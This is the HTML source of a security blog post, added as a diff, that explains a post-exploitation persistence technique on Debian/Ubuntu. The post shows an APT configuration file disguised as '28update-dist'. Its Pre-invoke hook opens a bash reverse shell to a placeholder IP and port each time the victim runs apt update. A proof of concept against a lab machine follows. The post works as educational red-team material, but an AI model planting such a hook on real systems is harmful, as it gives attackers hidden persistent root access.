@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="http://localhost:1313/assets/favicon.ico" type="image/x-icon">
+  <title>Persistence with APT | Kiwiyumi</title>
+  <link rel="stylesheet" href="http://localhost:1313/assets/css/post.css" />
+  <script defer src="http://localhost:1313/assets/js/lbox.js"></script>
+  
+  <link rel="stylesheet" href="http://localhost:1313/assets/css/common.css" />
+  </head>
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="http://localhost:1313/">Kiwiyumi</a>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Persistence with APT</h2>
+          <small class="date">Wed Feb 28, 2024</small>
+          <div class="tags">
+            
+            <a href="http://localhost:1313/tags/post-exploitation" class="tag">post-exploitation</a>
+            
+            <a href="http://localhost:1313/tags/persistence" class="tag">persistence</a>
+            
+          </div>
+        </div>
+        <div class="content"><p>In today&rsquo;s article we&rsquo;ll talk about how to create a persistence from the APT package manager.</p>
+<h1 id="what-is-apt">What is APT?</h1>
+<p>Advanced Package Tool (APT) is a command-line tool found in Debian/Ubuntu-based distributions, responsible for updating, installing, removing and managing packages.</p>
+<h1 id="how-does-it-work">How does it work?</h1>
+<p>Understanding the purpose of APT, there are several commands that a user can use, one of which is the <strong>update</strong> function, with the purpose of downloading updates and package information from all configured sources (repositories). Below is the command to run update:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>sudo apt update
+</span></span></code></pre></div><p>In case you didn&rsquo;t notice in the previous command, APT is always used with <strong>Root</strong> permission, guaranteeing a shell with administrative permission.</p>
+<h1 id="configuring-persistence">Configuring Persistence</h1>
+<p>When you gain access to the victim&rsquo;s machine, you must already have administrative permission, because only root users have permission to configure the APT directory, located at:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/etc/apt/apt.conf.d
+</span></span></code></pre></div><p>In this directory, create a file that looks legitimate, for example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch 28update-dist
+</span></span></code></pre></div><p>With the file created, use a text editor you like and enter the following malicious command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>APT::Update::Pre-invoke <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#39; 2&gt; /dev/null &amp;&#34;</span><span style="color:#f92672">}</span>;
+</span></span></code></pre></div><p>A brief explanation of the previous command, the first part is responsible for telling APT to invoke an action at update time, our reverse shell in this case. Next we have a classic reverse shell, then we redirect error messages to <strong>/dev/null</strong> and then we leave all this running in the background.</p>
+<p>The following images show the file created on the victim&rsquo;s server and its contents:</p>
+<p><img src="/assets/images/persistence-with-apt/efd908a1-5b7b-46fe-baa0-c89287666033.png" alt=""></p>
+<p><img src="/assets/images/persistence-with-apt/f9450365-4571-4c3f-b954-8c5b8582e223.png" alt=""></p>
+<h1 id="proof-of-concept">Proof of Concept</h1>
+<p>To carry out the proof of concept, two machines were used, a Kali Linux (Attacker) and an Ubuntu Server (Victim).</p>
+<p>At first, the attacker must leave a port open waiting for the connection to be received. While on the victim&rsquo;s side, it is necessary to wait for them to update their packages with <strong>update</strong>, the moment they do so we can see that we have received a connection with an administrative shell. The following image illustrates this:</p>
+<p><img src="/assets/images/persistence-with-apt/08b85f18-330b-4b7e-97c4-634533664ff2.png" alt=""></p>
+<h1 id="how-to-fix">How to fix</h1>
+<p>If you have found a suspicious package, the mitigation is simple! Just delete the package responsible for doing so.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>In this article we can understand how an attacker can exploit APT to achieve persistence on Debian/Ubuntu systems, a technique that depends on the interaction of the legitimate user.</p>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://ubuntu.com/server/docs/package-management">https://ubuntu.com/server/docs/package-management</a></li>
+</ul></div>
+      </section>
+      <footer>
+  <p>&copy; 2023 - 2024 </p>
+</footer>
+    </main>
+  </body>
+</html>
